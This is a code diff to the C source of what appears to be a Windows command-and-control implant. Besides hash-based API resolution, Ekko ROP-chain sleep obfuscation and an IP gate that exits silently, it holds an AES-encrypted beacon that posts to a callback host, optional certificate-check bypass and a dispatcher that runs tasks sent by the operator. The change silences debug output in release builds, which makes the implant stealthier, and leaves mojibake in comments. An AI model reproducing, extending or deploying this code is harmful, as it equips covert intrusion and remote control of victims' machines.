@@ -1,4 +1,4 @@
-#include "comms.h"
+﻿#include "comms.h"
 #include "anti_analysis.h"
 #include "beacon.h"
 #include "common.h"
@@ -10,6 +10,11 @@
 #include "postex.h"
 #include "recon.h"
 
+#ifdef BEACON_TEST
+  #define DBG(fmt, ...) printf(fmt, ##__VA_ARGS__)
+#else
+  #define DBG(fmt, ...) ((void)0)
+#endif
 
 #define INITIAL_SEED 5
 #define C_PTR(x) (PVOID)(x)
@@ -131,7 +136,7 @@ BOOL ip_whitelist_gate(VOID) {
     return TRUE;
 
   ExitProcess(0); // silent exit
-  return FALSE;   // unreachable — satisfies compiler
+  return FALSE;   // unreachable â€” satisfies compiler
 }
 
 
@@ -206,7 +211,7 @@ static BOOL InitializeWinApi32(OUT PWIN32_API pWin32Apis) {
   HMODULE hAdvapi32 = LoadLibraryA("Advapi32");
 
   if (!hNtdll || !hAdvapi32) {
-    printf("[!] InitializeWinApi32: module load failed\n");
+    DBG("[!] InitializeWinApi32: module load failed\n");
     return FALSE;
   }
 
@@ -227,7 +232,7 @@ static BOOL InitializeWinApi32(OUT PWIN32_API pWin32Apis) {
   if (!pWin32Apis->RtlCreateTimerQueue || !pWin32Apis->RtlCreateTimer ||
       !pWin32Apis->NtCreateEvent || !pWin32Apis->NtContinue ||
       !pWin32Apis->SystemFunction032) {
-    printf("[!] InitializeWinApi32: one or more pointers NULL\n");
+    DBG("[!] InitializeWinApi32: one or more pointers NULL\n");
     return FALSE;
   }
   return TRUE;
@@ -285,7 +290,7 @@ static VOID EkkoObf(IN PWIN32_API pWin32Apis, IN DWORD dwTimeOut) {
     Ctx[i].Rsp -= sizeof(PVOID);
   }
 
-  // ROP chain — 7 frames
+  // ROP chain â€” 7 frames
   Ctx[0].Rip = U_PTR(WaitForSingleObjectEx);
   Ctx[0].Rcx = U_PTR(EvntStart);
   Ctx[0].Rdx = U_PTR(INFINITE);
@@ -339,7 +344,7 @@ static BOOL g_ApiInit = FALSE;
 VOID ekko_sleep(DWORD sleepMs) {
   if (!g_ApiInit) {
     if (!InitializeWinApi32(&g_Win32Api)) {
-      printf("[!] ekko_sleep: API init failed, falling back to Sleep()\n");
+      DBG("[!] ekko_sleep: API init failed, falling back to Sleep()\n");
       Sleep(sleepMs);
       return;
     }
@@ -370,21 +375,21 @@ BOOL beacon_post(BYTE *payload, DWORD payloadLen, BYTE **responseOut,
 
   // encrypt outbound payload
   if (!aes_encrypt_payload(payload, payloadLen, &pEncrypted, &dwEncryptSize)) {
-    printf("[!] aes_encrypt_payload failed\n");
+    DBG("[!] aes_encrypt_payload failed\n");
     goto CLEANUP;
   }
 
   // resolve WinHTTP module via hash
   // resolve WinHTTP module via hash
   hWinHttp = GetModuleHandleH(WINHTTP_DLL_HASH);
-  printf("[COMMS] GetModuleHandleH: %p\n", hWinHttp);
+  DBG("[COMMS] GetModuleHandleH: %p\n", hWinHttp);
   if (!hWinHttp)
     hWinHttp = LoadLibraryA("winhttp.dll");
   if (!hWinHttp) {
-    printf("[!] winhttp.dll not found\n");
+    DBG("[!] winhttp.dll not found\n");
     goto CLEANUP;
   }
-  printf("[COMMS] winhttp.dll loaded at %p\n", hWinHttp);
+  DBG("[COMMS] winhttp.dll loaded at %p\n", hWinHttp);
 
   fnWinHttpOpen pOpen =
       (fnWinHttpOpen)GetProcAddressH(hWinHttp, WinHttpOpen_HASH);
@@ -403,14 +408,14 @@ BOOL beacon_post(BYTE *payload, DWORD payloadLen, BYTE **responseOut,
   fnWinHttpQueryHeaders pQuery = (fnWinHttpQueryHeaders)GetProcAddressH(
       hWinHttp, WinHttpQueryHeaders_HASH);
 
-  printf("[COMMS] Hash resolution: Open=%p Connect=%p OpenReq=%p Send=%p\n",
+  DBG("[COMMS] Hash resolution: Open=%p Connect=%p OpenReq=%p Send=%p\n",
          pOpen, pConnect, pOpenReq, pSend);
-  printf("[COMMS] Hash resolution: Recv=%p Read=%p Close=%p Query=%p\n", pRecv,
+  DBG("[COMMS] Hash resolution: Recv=%p Read=%p Close=%p Query=%p\n", pRecv,
          pRead, pClose, pQuery);
 
   if (!pOpen || !pConnect || !pOpenReq || !pSend || !pRecv || !pRead ||
       !pClose || !pQuery) {
-    printf("[!] WinHTTP hash resolution failed\n");
+    DBG("[!] WinHTTP hash resolution failed\n");
     goto CLEANUP;
   }
 
@@ -426,43 +431,43 @@ BOOL beacon_post(BYTE *payload, DWORD payloadLen, BYTE **responseOut,
   hRequest = pOpenReq(hConnect, L"POST", g_CallbackEndpoint, NULL, WINHTTP_NO_REFERER,
                       WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
   if (!hRequest) {
-    printf("[!] pOpenReq FAILED: %lu\n", GetLastError());
+    DBG("[!] pOpenReq FAILED: %lu\n", GetLastError());
     goto CLEANUP;
   }
-  printf("[COMMS] pOpenReq OK\n");
+  DBG("[COMMS] pOpenReq OK\n");
 
 #ifdef BEACON_TEST
-  printf("[COMMS] Setting cert bypass flags\n");
+  DBG("[COMMS] Setting cert bypass flags\n");
   DWORD dwFlags2 = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                    SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                    SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                    SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
   if (!WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags2,
                         sizeof(dwFlags2)))
-    printf("[!] WinHttpSetOption FAILED: %lu\n", GetLastError());
+    DBG("[!] WinHttpSetOption FAILED: %lu\n", GetLastError());
   else
-    printf("[COMMS] Cert bypass set OK\n");
+    DBG("[COMMS] Cert bypass set OK\n");
 #endif
 
-  printf("[COMMS] Sending %lu encrypted bytes to %S:%d%S\n", dwEncryptSize,
+  DBG("[COMMS] Sending %lu encrypted bytes to %S:%d%S\n", dwEncryptSize,
          g_CallbackHost, CALLBACK_PORT, g_CallbackEndpoint);
   if (!pSend(hRequest, L"Content-Type: application/octet-stream\r\n",
              (DWORD)-1L, pEncrypted, dwEncryptSize, dwEncryptSize, 0)) {
-    printf("[!] pSend FAILED: %lu\n", GetLastError());
+    DBG("[!] pSend FAILED: %lu\n", GetLastError());
     goto CLEANUP;
   }
-  printf("[COMMS] pSend OK\n");
+  DBG("[COMMS] pSend OK\n");
 
   if (!pRecv(hRequest, NULL)) {
-    printf("[!] pRecv FAILED: %lu\n", GetLastError());
+    DBG("[!] pRecv FAILED: %lu\n", GetLastError());
     goto CLEANUP;
   }
-  printf("[COMMS] pRecv OK\n");
+  DBG("[COMMS] pRecv OK\n");
 
   pQuery(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
          WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &statusSize,
          WINHTTP_NO_HEADER_INDEX);
-  printf("[COMMS] HTTP status: %lu\n", statusCode);
+  DBG("[COMMS] HTTP status: %lu\n", statusCode);
 
   if (statusCode != 200) {
     bSuccess = TRUE;
@@ -500,7 +505,7 @@ BOOL beacon_post(BYTE *payload, DWORD payloadLen, BYTE **responseOut,
   // decrypt inbound task blob
   if (!aes_decrypt_payload(pResponse, dwRespTotal, &pDecrypted,
                            &dwDecryptSize)) {
-    printf("[!] aes_decrypt_payload failed\n");
+    DBG("[!] aes_decrypt_payload failed\n");
     goto CLEANUP;
   }
 
@@ -599,7 +604,7 @@ VOID dispatch_task(BYTE *taskBlob, DWORD taskBlobLen) {
 
   json_get_string(json, "id", taskId, sizeof(taskId));
   if (!json_get_string(json, "command", command, sizeof(command))) {
-    printf("[!] dispatch_task: no command field\n");
+    DBG("[!] dispatch_task: no command field\n");
     goto cleanup;
   }
 
@@ -607,7 +612,7 @@ VOID dispatch_task(BYTE *taskBlob, DWORD taskBlobLen) {
   if (hasArgs)
     json_get_string(json, "args", args, sizeof(args));
 
-  printf("[*] task id=%s cmd=%s args=%s\n", taskId, command,
+  DBG("[*] task id=%s cmd=%s args=%s\n", taskId, command,
          hasArgs ? args : "(null)");
 
   // dispatch 
@@ -714,7 +719,7 @@ VOID dispatch_task(BYTE *taskBlob, DWORD taskBlobLen) {
     killswitch_soft();
 
   } else {
-    printf("[!] Unknown command: %s\n", command);
+    DBG("[!] Unknown command: %s\n", command);
   }
 
 cleanup:
